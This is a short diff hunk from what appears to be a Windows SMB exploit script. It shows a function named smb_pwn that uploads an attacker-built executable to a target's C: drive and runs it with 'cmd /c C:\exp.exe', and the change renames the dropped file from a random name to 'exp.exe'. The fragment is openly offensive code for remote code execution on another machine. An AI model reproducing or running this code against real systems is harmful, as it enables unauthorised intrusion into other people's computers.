@@ -974,7 +974,7 @@ def get_group_data_from_token(info, tokenData):
 def smb_pwn(conn, arch, target):
 	smbConn = conn.get_smbconnection()
 	print('Going for malicious service')
-	smb_send_file(smbConn, '/tmp/'+target+'-serv.exe', 'C', '/yefYUeyfv38.exe')
+	smb_send_file(smbConn, '/tmp/'+target+'-serv.exe', 'C', '/exp.exe')
 	service_exec(conn, r'cmd /c C:\exp.exe')
 
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
